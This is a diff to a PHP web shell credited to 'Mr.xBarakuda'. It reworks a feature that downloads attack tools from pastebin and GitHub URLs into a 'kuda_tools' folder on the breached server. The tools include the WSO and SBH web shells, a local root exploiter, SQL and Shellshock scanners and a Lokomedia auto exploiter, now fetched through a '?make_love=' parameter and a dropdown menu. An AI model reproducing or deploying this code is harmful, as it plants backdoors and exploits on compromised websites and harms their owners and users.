@@ -469,37 +469,39 @@ foreach ($d0mains as $d0main) {
 }
 }
 function CreateTools($names, $lokasi) {
-if ($_GET['make_love'] == $names) {
-    $a = $_SERVER['SERVER_NAME'];
-    $b = dirname($_SERVER['PHP_SELF']);
-    $c = "/kuda_tools/" . $names . ".php";
-    if (file_exists('kuda_tools/' . $names . '.php')) {
-        echo '<script>alert("DONE!");window.location.href="kuda_tools/' . $names . '.php";</script>';
+    if (!is_dir('kuda_tools')) {
+        mkdir('kuda_tools', 0777);
     }
-    else {
-        mkdir("kuda_tools", 0777);
-        file_put_contents('kuda_tools/' . $names . '.php', file_get_contents($lokasi));
-        echo '<script>alert("DONE!");window.location.href="kuda_tools/' . $names . '.php";</script>';
+    $file = 'kuda_tools/' . $names . '.php';
+    if (!file_exists($file)) {
+        $content = @file_get_contents($lokasi);
+        if ($content !== false) {
+            file_put_contents($file, $content);
+        }
+    }
+    header("Location: " . $file);
+    exit;
+}
+if (isset($_GET['make_love'])) {
+    $tools = [
+        "wso404" => "https://pastebin.com/raw/BMTGUY6J",
+        "obfuscator" => "https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/obfuscator.txt",
+        "noname" => "https://pastebin.com/raw/NXidmXn5",
+        "blackhat" => "https://raw.githubusercontent.com/SurabayaBlackhat/sbh-shell/master/Shell-v.2.5.php",
+        "sqlscan" => "https://pastebin.com/raw/3jwmYBzc",
+        "iptrack" => "https://pastebin.com/raw/tGEFiPYm",
+        "lokmed" => "https://pastebin.com/raw/0STXanAx",
+        "rootex" => "https://raw.githubusercontent.com/mukarramkhalid/root-exploiter-php-cpp/master/root-c.php",
+        "shellshock" => "https://pastebin.com/raw/ZB3DLXwR"
+
+    ];
+
+    $target = $_GET['make_love'];
+    if (array_key_exists($target, $tools)) {
+        CreateTools($target, $tools[$target]);
     }
 }
-}
-#CreateTools("promailerv2","http://pastebin.com/raw/Rk9v6eSq");
-#CreateTools("bukalapak","http://pastebin.com/raw/6CB8krDi");
-#CreateTools("tokped","http://pastebin.com/raw/dvhzWgby");
-#CreateTools("mailer","http://pastebin.com/raw/9yu1DmJj");
-#CreateTools("tokenpp","http://pastebin.com/raw/72xgmtPL");
-#CreateTools("extractor","http://pastebin.com/raw/jQnMFHBL");
-#CreateTools("webdav","https://pastebin.com/raw/8szajjXK");
-CreateTools("obfuscator", "https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/obfuscator.txt");
-CreateTools("shellshock", "https://pastebin.com/raw/ZB3DLXwR");
-CreateTools("rootex", "https://raw.githubusercontent.com/mukarramkhalid/root-exploiter-php-cpp/master/root-c.php");
-CreateTools("lokmed", "https://pastebin.com/raw/0STXanAx");
-CreateTools("iptrack", "https://pastebin.com/raw/tGEFiPYm");
-CreateTools("webconsole", "https://raw.githubusercontent.com/flux10n/webconsole/main/webconsole.php");
-CreateTools("sqlscan", "https://pastebin.com/raw/3jwmYBzc");
-CreateTools("blackhat", "https://raw.githubusercontent.com/SurabayaBlackhat/sbh-shell/master/Shell-v.2.5.php");
-CreateTools("noname", "https://pastebin.com/raw/NXidmXn5");
-CreateTools("wso404", "https://pastebin.com/raw/BMTGUY6J");
+$base_url = $_SERVER['PHP_SELF'];
 if (isset($_GET['dir'])) {
 $dir = $_GET['dir'];
 chdir($dir);
@@ -5193,24 +5195,22 @@ if (!is_readable($dir)) {
 
 }
 else {
-    echo "<center><hr color=deepskyblue>
+    echo "<center>'
+    <hr color='deepskyblue'>
     <form>
-    <select onchange='if (this.value) window.open(this.value);'>
-    <option selected='selected' value=''>Extra Tools</option>
-    <option value='$ling=wso404'>WSO 404 Shell</option>
-    <option value='$ling=blackhat'>SBH Shell</option>
-    <option value='$ling=noname'>Noname Shell</option>
-    <option value='$ling=rootex'>Local Root Exploiter (No-Backconnect)</option>
-    <option value='$ling=sqlscan'>SQL Scanner (Bing Dorker)</option>
-    <option value='$ling=shellshock'>Shell Shock Scanner</option>
-    <option value='$ling=webconsole'>Web Console</option>
-    <option value='$ling=iptrack'>IP Tracker</option>
-    <option value='$ling=lokmed'>Lokmed Auto Exploiter</option>
-    <option value='$ling=obfuscator'>PHP Obfuscator</option>
-    </select>
-    <noscript><input type='submit' value='Submit'></noscript>
+        <select onchange='if(this.value) window.location.href=this.value;'>
+            <option value="">Extra Tools</option>
+            <option value='".$base_url."'?make_love=wso404'>WSO 404 Shell</option>
+            <option value='".$base_url."'?make_love=noname'>NoName Shell</option>
+            <option value='".$base_url."'?make_love=blackhat'>SBH Shell</option>
+            <option value='".$base_url."'?make_love=iptrack'>IP Tracker</option>
+            <option value='".$base_url."'?make_love=sqlscan'>SQL Scanner + Admin Login</option>
+            <option value='".$base_url."'?make_love=lokmed'>Lokomedia Exploit</option>
+            <option value='".$base_url."'?make_love=rootex'>Root Checker</option>
+            <option value='".$base_url."'?make_love=obfuscator'>PHP Obfuscator</option>
+        </select>
     </form>
-    </center>";
+</center>";
 }
 echo "<center>Copyright &copy; ".date("Y")."<a href='https://www.google.com/search?q=intext:Mr.xBarakuda' target='_blank'><font color='deepskyblue'> Mr.xBarakuda</a></font><font color='red'> &#9822;</font></center>";
 }
